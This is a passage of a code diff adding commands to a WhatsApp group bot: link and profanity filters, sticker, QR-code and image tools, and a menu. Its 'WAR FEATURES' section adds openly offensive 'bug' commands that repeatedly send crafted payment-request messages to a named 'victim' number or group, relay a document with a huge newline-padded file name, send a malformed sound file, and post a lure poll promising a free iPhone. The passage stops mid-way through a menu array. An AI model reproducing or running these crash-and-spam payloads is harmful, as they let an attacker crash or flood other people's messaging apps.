+} else if (args[0] === 'off'){
+let anu = autosticker.indexOf(from)
+_autostick.splice(anu, 1)
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+m.reply('autosticker pc deactivated')
+}
+break
+case 'antilinkgc': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLink) return m.reply('Already activated')
+ntilink.push(from)
+m.reply('Success in turning on group chat antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the group link in this group or u will be kicked immediately`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLink) return m.reply('Already deactivated')
+let off = ntilink.indexOf(from)
+ntilink.splice(off, 1)
+m.reply('Success in turning off group chat antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkYoutubeVid) return m.reply('Already activated')
+ntilinkytvid.push(from)
+m.reply('Success in turning on youtube video antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
+let off = ntilinkytvid.indexOf(from)
+ntilinkytvid.splice(off, 1)
+m.reply('Success in turning off youtube video antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkYoutubeChannel) return m.reply('Already activated')
+ntilinkytch.push(from)
+m.reply('Success in turning on youtube channel antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkYoutubeChannel) return m.reply('Already deactivated')
+let off = ntilinkytch.indexOf(from)
+ntilinkytch.splice(off, 1)
+m.reply('Success in turning off youtube channel antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkInstagram) return m.reply('Already activated')
+ntilinkig.push(from)
+m.reply('Success in turning on instagram antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkInstagram) return m.reply('Already deactivated')
+let off = ntilinkig.indexOf(from)
+ntilinkig.splice(off, 1)
+m.reply('Success in turning off instagram antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+        case 'antilinkfacebook': case 'antilinkfb': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkFacebook) return m.reply('Already activated')
+ntilinkfb.push(from)
+m.reply('Success in turning on facebook antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkFacebook) return m.reply('Already deactivated')
+let off = ntilinkfb.indexOf(from)
+ntilinkfb.splice(off, 1)
+m.reply('Success in turning off facebook antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+          case 'antilinktelegram': case 'antilinktg': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkTelegram) return m.reply('Already activated')
+ntilinktg.push(from)
+m.reply('Success in turning on telegram antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkTelegram) return m.reply('Already deactivated')
+let off = ntilinkig.indexOf(from)
+ntilinkig.splice(off, 1)
+m.reply('Success in turning off telegram antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+            case 'antilinktiktok': case 'antilinktt': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkTiktok) return m.reply('Already activated')
+ntilinktt.push(from)
+m.reply('Success in turning on tiktok antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkTiktok) return m.reply('Already deactivated')
+let off = ntilinktt.indexOf(from)
+ntilinktt.splice(off, 1)
+m.reply('Success in turning off tiktok antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkTwitter) return m.reply('Already activated')
+ntilinktwt.push(from)
+m.reply('Success in turning on twitter antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkTwitter) return m.reply('Already deactivated')
+let off = ntilinktwt.indexOf(from)
+ntilinktwt.splice(off, 1)
+m.reply('Success in turning off twitter antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+              case 'antilinkall': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiLinkTwitter) return m.reply('Already activated')
+ntilinkall.push(from)
+m.reply('Success in turning on all antilink in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiLinkAll) return m.reply('Already deactivated')
+let off = ntilinkall.indexOf(from)
+ntilinkall.splice(off, 1)
+m.reply('Success in turning off all antilink in this group')
+} else {
+  let buttonsntilink = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+case 'antitoxic': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (antiToxic) return m.reply('Already activated')
+nttoxic.push(from)
+m.reply('Success in turning on antitoxic in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!antiToxic) return m.reply('Already deactivated')
+let off = nttoxic.indexOf(from)
+nttoxic.splice(off, 1)
+m.reply('Success in turning off antitoxic in this group')
+} else {
+  let buttonsnttoxic= [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+case 'animesticker': case 'animestick': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'mukelu': case 'lu': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await XeonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'toqr':{
+  if (!q) return m.reply(' Please include link or text!')
+   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
+   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
+   let buff = getRandom('.jpg')
+   await fs.writeFileSync('./'+buff, data)
+   let medi = fs.readFileSync('./' + buff)
+  await XeonBotInc.sendMessage(from, { image: medi, caption:"Here you go! 🏃🏻‍♂️"}, { quoted: m })
+   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
+  }
+  break
+case 'upscaler':{
+	if (!isQuotedImage) return m.reply('Reply the picture!')
+     let media = await XeonBotInc.downloadAndSaveMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
+      let tph = await TelegraPh(media)
+     let anu = await imgSuper(tph)
+     console.log(tph)
+     console.log(anu)
+     await XeonBotInc.sendMessage(from, { image: { url: anu.output_url }, caption:"Here you go! 🏃🏻‍♂️"}, { quoted: m })
+     
+   }
+   break
+case 'setthumb':{
+                       if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
+                       if (!isQuotedImage) return m.reply('Reply the picture!')
+                                 let media = await XeonBotInc.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
+                await fs.writeFileSync('./XeonMedia/theme/cheemspic.jpg', media)
+               m.reply(mess.success)
+            }
+          break
+case 'imagenobg': case 'removebg': case 'remove-bg': {
+   if (!isQuotedImage) return m.reply('Reply the picture!') 
+     let media = await XeonBotInc.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
+     let ranE = getRandom('.jpg')
+       await fs.writeFileSync('./XeonMedia/image/' + ranE, media)
+     const _buff = './XeonMedia/image/' + ranE
+     let anu = await remove(fs.readFileSync(_buff))
+     console.log(anu)
+      	let ranJ = getRandom('.jpg')
+        await fs.writeFileSync('./XeonMedia/image/' + ranJ, anu)
+        const buff = './XeonMedia/image/' + ranJ        
+          await XeonBotInc.sendMessage(from, { image: { url: buff }, caption:"Here you go! 🏃🏻‍♂️"}, { quoted: m })
+        setTimeout(() => { fs.unlinkSync(buff) }, 10000)
+        setTimeout(() => { fs.unlinkSync(_buff) }, 10000)     
+   }
+   break
+case 'readqr':{
+   if ((!isMedia && !isQuotedImage)  && args.length == 0) {
+   let buffer = await XeonBotInc.downloadAndSaveMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
+    var Jimp = require("jimp");
+   Jimp.read(buffer, function(err, image) {
+    if (err) {
+        console.error(err);
+        //handle error
+    }
+    var qr = new QrCode();
+    qr.callback = function(err, value) {
+        if (err) {
+            console.error(err);
+            //handle error
+        }
+        console.log(value.result);
+       m.reply(value.result)     
+    };
+    qr.decode(image.bitmap);
+    });
+   } else { m.reply(`Reply image with caption ${prefix + command} \n`) }
+   }
+   break
+case 'swm': case 'stickerwm': case 'wm': case 'take': {  
+            let text1 = q.split("|")[0]
+            let text2 = q.split("|")[1]
+              if (!isQuotedSticker) return m.reply(`Reply to a sticker with caption ext|text\n\nExample: ${prefix + command} Cheems|Xeon`)   
+              if (!text1) return m.reply(`Example! : ${order + ' ' + `Cheems|Xeon`}`)    
+              if (!text2) return m.reply(`Example! : ${order + ' ' + `Cheems|Xeon`}`)
+                XeonBotInc.sendMessage(from, { react: { text: "🔖", key: m.key }})
+          try{ 
+             let buff = await XeonBotInc.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
+             console.log(buff)
+             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
+             await XeonBotInc.sendMessage(from, { sticker: { url: proc } }, { quoted: m })
+             await fs.unlinkSync(proc)
+           } catch (e) { m.reply(e) }
+          }
+          break
+case 'creategroup':
+if (!isCreator) return m.reply(mess.owner)
+if (!q) return reply("Enter text")
+const group = await XeonBotInc.groupCreate(q, [owner + "@s.whatsapp.net"])
+m.reply(mess.success)
+XeonBotInc.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
+break
+case 'addanoucment': case 'addannouncement':
+				if (!isCreator) return m.reply(mess.owner)
+				xeonannou.push(`${q}`)
+				xeonannou.splice(0,1)
+				fs.writeFileSync('./database/anoucement.json', JSON.stringify(snt))
+				m.reply('success anoucement!')
+				break
+case 'polltes':{
+if (!args[0]) throw `Example: tes|tes|tes`
+if (!text.includes('|')) throw  `Separate with *|* \n\nExample : \n*${prefix + command}* my poll |n|tes|tes|tes`
+let name = await XeonBotInc.getName(m.sender)
+let a = []
+let b = text.split('|')
+for (let c = 1 || 0; c < b.length; c++) {
+a.push([b[c]])
+			}
+			return XeonBotInc.sendPoll(m.chat, `*Survey requested by:* ${name}\n\n*Message:* ${text.split('|')[0]}`, a, m)
+}
+break
+
+
+
+//-------------------🔖WAR FEATURES🔖-----------------\\
+//-------------------🔖WAR FEATURES🔖-----------------\\
+//-------------------🔖WAR FEATURES🔖-----------------\\
+case 'poll': {
+if (!isCreator) return
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": botname,
+"options": [
+	{
+"optionName": "VOTE FOR PLEASURE"
+	},
+	{
+"optionName": "VOTE AND WIN IPHONE 14 PRO MAX"
+	},
+	{
+"optionName": "VOTE TO GET FREE +84 NUMBER"
+	},
+	{
+"optionName": "VOTE TO GET +54"
+	},
+	{
+"optionName": "VOTE TO GET +64"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+deploy('Successful sendbug')
+}
+break
+case 'thisbug': {
+if (!isCreator) return
+let teks = ` *THIS IS A BUG BRO? 🔖
+ 🔖*Message : ${q ? q : 'empty'}*\n\n`
+for (let mem of participants) {
+teks += `🔖­” @${mem.id.split('@')[0]}\n`
+}
+XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
+}
+break
+case 'cbugpc': {
+if (args.length < 1) return m.reply(`*Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Okay sir!`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": wm,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Success Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
+case 'cbuggc': {
+if (!isCreator) return
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 916909@g.us|1|10s\n\n\ns = Second\n\nMake sure the bot has entered the group`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+m.reply(`Okay sir`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER HW MODS WA`,
+}
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
+case 'oneshot': {
+if (!isCreator) return
+lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
+XeonBotInc.sendMessage(m.chat, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+}
+break
+case 'oneshot2': {
+if (!isCreator) return
+ lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
+ XeonBotInc.sendMessage(m.chat, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+ }
+ break
+case 'docbug': {
+if (!isCreator) return
+var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
+"mimetype": "",
+"title": botname,
+"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+"pageCount": 0,
+"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
+"fileName": `🔖¦„${ownername}🔖¦„\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbut2}.sound`,
+"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
+"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
+"mediaKeyTimestamp": "1658703206",
+}
+}), { userJid: m.chat })
+XeonBotInc.relayMessage(m.chat, document.message, { messageId: document.key.id })
+}
+break
+
+
+
+
+case 'tqtt': 
+throw `Thanks to
+My family
+And all friends who helped assemble this sexy script !!!`
+break
+case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
+            let ownernya = ownernomer + '@s.whatsapp.net'
+            let me = m.sender
+            let timestampe = speed();
+            let latensie = speed() - timestampe
+            let xeonezy = `
+Assalamualaikum 🙇🏻‍♂️‘
+👋🏻 ${pushname} 
+  ${ucapanWaktu}  💭
+
+💲: ${latensie.toFixed(4)} miliseconds
+💲: ${runtime(process.uptime())}
+💲: @${ini_mark.split('@')[0]}
+💲: ${global.botname}
+💲: @${ownernya.split('@')[0]}
+        NO-PREFIX 
+💲: ${XeonBotInc.public ? 'Public' : `Self`}
+💲: ${os.hostname()}
+💲: ${os.platform()}
+💲: ${Object.keys(global.db.data.users).length}
+💲: ${jumlahcmd}
+💲: ${jumlahharian}
+
+🥷🏻: ${pushname}
+ 🕴🏻: @${me.split('@')[0]}
+🕴🏻: ${isPremium ? '🧑🏻‍💻' : ``}
+🕴🏻: ${isPremium ? 'Infinity' : `${db.data.users[m.sender].limit}`}
+
+⏰: ${xtime}
+🏷️: ${xdate}
+   🛂  Please Select
+   🛂  The Button Below 🐤
+   `
+            let ments = [ownernya, me, ini_mark]        
+            let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: 'All Menu' }, type: 1 },{ buttonId: 'command', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'sc', buttonText: { displayText: 'Script' }, type: 1 }]
+            let buttonMessage = {
+  document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
+  fileName : `${groupMetadata.subject}`,
+  mimetype: `${docs}`,
+  fileLength: '99999999999999',
+  pageCount: '1000000000',
+  caption: xeonezy,
+  footer: botname,
+  buttons: buttons,
+  mentions: ments,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: botname,
+  body: wm, 
+  showAdAttribution: true,
+  thumbnail: thumb,
+  mediaType: 2,
+  mediaUrl: websitex,
+  sourceUrl: websitex
+  }}
+  }
+  XeonBotInc.sendMessage(m.chat, buttonMessage, {quoted: fkontak})
+  }
+ break
+            break
+            case 'command': {
+	const sections = [{
+								"title": "Initial Features Of Bot 🥷🏻",
+								"rows": [
+									{
+										"title": "Other 🔖•",
+										"description": "Displays The List Of Other Features",
+										"rowId": `${prefix}othermenu`
+									}
+								]
+							},
+							{
+								"title": "Bot Features 🔖",
+								"rows": [
+									{
+										"title": "All Menu ",
+										"description": "Displays The List Of All The Features!",
+										"rowId": `${prefix}allmenu`
+									},
+									{
+										"title": "Owner Menu 🔖’ ",
+										"description": "Displays The List Of Owner Features",
+										"rowId": `${prefix}ownermenu`
+										},
+									{
+										"title": "Group Menu 🔖¨",
+										"description": "Displays The List Of Main Features",
+										"rowId": `${prefix}groupmenu`
+										},
+										{
+										"title": "Maker Menu 🔖",
+										"description": "Displays The List Of Logo Making Features",
+										"rowId": `${prefix}makermenu`
+									},
+									{
+										"title": "Sound Menu 🔖",
+										"description": "Displays The List Of Sound Features",
+										"rowId": `${prefix}soundmenu`
+									},
+									{
+										"title": "Download Menu 🔖",
+										"description": "Displays The List Of Download Features",
+										"rowId": `${prefix}downloadmenu`
+									},
+									{
+										"title": "Sticker Menu 🔖",
+										"description": "Displays The List Of Sticker Features",
+										"rowId": `${prefix}stickermenu`
+									},
+									{
+										"title": "Search Menu 🔖",
+										"description": "Displays The List Of Searching Features",
+										"rowId": `${prefix}searchmenu`
+									},
+									{
+										"title": "Random Image Menu 🔖",
+										"description": "Displays The List Of Random Image Features",
+										"rowId": `${prefix}randomimagemenu`
+									},
+									{
+										"title": "Image Effect Menu 🔖",
+										"description": "Displays The List Of Image Effect Features",
+										"rowId": `${prefix}imageeffectmenu`
+									},
+										{
+											"title": "Anime Menu 🔖",
+										"description": "Displays The List Of Random Anime Features",
+										"rowId": `${prefix}animemenu`
+										},
+										{
+											"title": "Emote Menu 🔖",
+										"description": "Displays The List Of Emote Features",
+										"rowId": `${prefix}emotemenu`
+										},
+										{
